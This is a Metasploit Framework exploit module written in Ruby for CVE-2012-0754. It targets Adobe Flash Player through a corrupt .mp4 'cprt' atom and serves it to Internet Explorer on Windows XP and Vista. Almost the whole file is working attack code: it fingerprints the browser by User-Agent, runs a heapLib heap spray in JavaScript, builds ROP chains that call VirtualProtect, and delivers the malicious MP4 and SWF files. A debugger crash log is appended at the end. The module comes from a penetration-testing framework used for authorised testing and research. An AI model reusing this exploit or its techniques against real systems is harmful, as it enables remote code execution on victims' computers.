##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Flash Player .mp4 'cprt' Overflow",
      'Description'    => %q{
        This module exploits a vulnerability found in Adobe Flash Player.
        By supplying a corrupt .mp4 file loaded by Flash, it is possible to gain arbitrary
        remote code exeuction under the context of the user.

        This vulnerability has been exploited in the wild as part of the 
        "Iran's Oil and Nuclear Situation.doc" phishing campaign.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Alexander Gavrun', # Vulnerability discovery
          'sinn3r',           # Metasploit module
          'juan vazquez'      # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-0754' ],
          [ 'OSVDB', '79300'],
          [ 'BID', '52034' ],
          [ 'URL', 'http://contagiodump.blogspot.com/2012/03/mar-2-cve-2012-0754-irans-oil-and.html' ]
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",
          'StackAdjustment' => -3500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Flash Player 11.1.102.55
          # Flash Player 10.3.183.10
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x800 - code.length', 'Ret' => 0x0c0c0c0c } ],
          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x800 - code.length', 'Ret' => 0x0c0c0c0c } ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Ret' => 0x77c15ed5 } ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre,    'Offset' => '0x5f4', 'Ret' => 0x77c15ed5 } ],
          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4', 'Ret' => 0x0c0c0c0c } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 15 2012",
      'DefaultTarget'  => 0))
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("L")[0].to_i
  end

  def nop
    return make_nops(4).unpack("L")[0].to_i
  end

  def get_payload(t)

    if ['Rop'].nil?
      code = ""
    else
      code = "\xbc\x0c\x0c\x0c\x0c"  #Fix the stack to avoid a busted encoder
    end
    code << payload.encoded

    # No rop. Just return the payload.
    return code if t['Rop'].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
    when :msvcrt
      print_status("Using msvcrt ROP")
      rop =
      [
        0x77c4e392,  # POP EAX # RETN
        0x77c11120,  # <- *&VirtualProtect()
        0x77c2e493,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
        junk,
        0x77c2dd6c,
        0x77c4ec00,  # POP EBP # RETN
        0x77c35459,  # ptr to 'push esp #  ret'
        0x77c47705,  # POP EBX # RETN
        0x00000800,  # <- change size to mark as executable if needed (-> ebx)
        0x77c3ea01,  # POP ECX # RETN
        0x77c5d000,  # W pointer (lpOldProtect) (-> ecx)
        0x77c46100,  # POP EDI # RETN 
        0x77c46101,  # ROP NOP (-> edi)
        0x77c4d680,  # POP EDX # RETN
        0x00000040,  # newProtect (0x40) (-> edx)
        0x77c4e392,  # POP EAX # RETN
        nop,  # NOPS (-> eax)
        0x77c12df9,  # PUSHAD # RETN
      ].pack("V*")

    when :jre
      print_status("Using JRE ROP")
      rop =
      [
        0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
        0xfffffdff,  # Value to negate, will become 0x00000201 (dwSize)
        0x7c347f98,  # RETN (ROP NOP)
        0x7c3415a2,  # JMP [EAX]
        0xffffffff,
        0x7c376402,  # skip 4 bytes
        0x7c351e05,  # NEG EAX # RETN
        0x7c345255,  # INC EBX # FPATAN # RETN
        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
        0x7c344f87,  # POP EDX # RETN
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x7c351eb1,  # NEG EDX # RETN
        0x7c34d201,  # POP ECX # RETN
        0x7c38b001,  # &Writable location
        0x7c347f97,  # POP EAX # RETN
        0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
        0x7c345c30,  # ptr to 'push esp #  ret '
      ].pack("V*")
    end

    pivot  = [0x77C1CAFB].pack('V*')  #POP/POP/RET
    pivot << [0x41414141].pack('V*')
    pivot << [t.ret].pack('V*')

    code = pivot + rop + code
    return code
  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1]  #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2]  #IE 7 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
      return targets[3]  #IE 8 on Windows XP SP3
    elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
      return targets[5]  #IE 7 on Windows Vista
    else
      return nil
    end
  end

  def on_request_uri(cli, request)

    agent = request.headers['User-Agent']
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have the same setup we're targeting
    if my_target.nil?
      print_error("Browser not supported, will not launch attack: #{agent.to_s}: #{cli.peerhost}:#{cli.peerport}")
      send_not_found(cli)
      return
    end

    print_status("Client requesting: #{request.uri}")

    # The SWF requests our MP4 trigger
    if request.uri =~ /\.mp4$/
      print_status("Sending MP4 to #{cli.peerhost}:#{cli.peerport}...")
      mp4 = create_mp4(my_target)
      send_response(cli, mp4, {'Content-Type'=>'video/mp4'})
      return
    end

    if request.uri =~ /\.swf$/
      print_status("Sending Exploit SWF")
      send_response(cli, @swf, { 'Content-Type' => 'application/x-shockwave-flash' })
      return
    end

    p = get_payload(my_target)

    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))

    js_pivot = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();
    heap_obj.debug(true);
    for (var i=1; i < 0x1C2; i++) {
      heap_obj.alloc(block);
    }
    heap_obj.debug(true);
    JS

    js_pivot = heaplib(js_pivot, {:noobfu => true})

    swf_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
    swf_uri << "/Exploit.swf"
    print_status(swf_uri)

    html = %Q|
<html>
<head>
<script>
#{js_pivot}
</script>
</head>
<body>
<center>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
id="test" width="1" height="1"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
<param name="movie" value="#{swf_uri}" />
<embed src="#{swf_uri}" quality="high"
width="1" height="1" name="test" align="middle"
allowNetworking="all"
type="application/x-shockwave-flash"
pluginspage="http://www.macromedia.com/go/getflashplayer">
</embed>

</object>
</center>

</body>
</html>
    |

    html = html.gsub(/^\t\t/, '')

    #
    # "/test.mp4" is currently hard-coded in the swf file, so we ned to add to resource
    #
    proc = Proc.new do |cli, req|
      on_request_uri(cli, req)
    end

    add_resource({'Path'=>'/test.mp4', 'Proc'=>proc}) rescue nil
    print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

  def exploit
    @swf = create_swf
    super
  end

  def create_swf
    path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-0754.swf" )
    fd = File.open( path, "rb" )
    swf = fd.read(fd.stat.size)
    fd.close

    return swf
  end

  def create_mp4(target)
    mp4 = ""
    mp4 << "\x00\x00\x00\x18"
    mp4 << "ftypmp42"
    mp4 << "\x00\x00\x00\x00"
    mp4 << "mp42isom"
    mp4 << "\x00\x00\x00\x0D"
    mp4 << "cprt"
    mp4 << "\x00\xFF\xFF\xFF"
    mp4 << "\x00\x00\x00\x00"
    mp4 << "\x0c\x0c\x0c\x0c" * 2586

    return mp4
  end

end

=begin
C:\WINDOWS\system32\Macromed\Flash\Flash11e.ocx
C:\WINDOWS\system32\Macromed\Flash\Flash10x.ocx

(510.9b4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0c0c0c0c ebx=03e46810 ecx=0396b160 edx=00000004 esi=03e46cd4 edi=00000000
eip=10048b65 esp=0428fd10 ebp=0428feb4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\Macromed\Flash\Flash10x.ocx - 
Flash10x+0x48b65:
10048b65 ff5008          call    dword ptr [eax+8]    ds:0023:0c0c0c14=????????
=end
